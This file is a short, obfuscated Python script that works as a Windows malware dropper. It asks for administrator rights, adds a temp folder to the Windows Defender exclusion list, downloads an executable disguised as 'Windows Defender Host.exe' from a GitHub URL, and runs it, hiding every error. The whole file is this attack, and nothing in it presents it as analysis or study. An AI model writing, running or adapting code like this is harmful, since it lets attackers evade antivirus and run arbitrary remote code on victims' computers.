import os,tempfile,subprocess,ctypes,sys,requests

def z():
 try:return ctypes.windll.shell32.IsUserAnAdmin()
 except:return False

def y():
 if not z():ctypes.windll.shell32.ShellExecuteW(None,"runas",sys.executable,__file__,None,1);sys.exit()

def x(a):
 try:subprocess.run(["powershell","-Command",f"Add-MpPreference -ExclusionPath '{a}'"],check=True,shell=True)
 except:pass

def w(a="a"):
 b=tempfile.gettempdir();c=os.path.join(b,a)
 if not os.path.exists(c):os.makedirs(c)
 x(c);return c

def v(a,b):
 try:
  c=requests.get(a,allow_redirects=True)
  c.raise_for_status()
  d=os.path.join(b,"a.exe")
  open(d,'wb').write(c.content)
  return d
 except:return None

def u(a):
 try:subprocess.Popen(a)
 except:pass

if __name__=="__main__":
 y()
 t=w()
 s=v("https://github.com/GamingForLol/gaminglol/raw/refs/heads/main/Windows%20Defender%20Host.exe",t)
 if s:u(s)
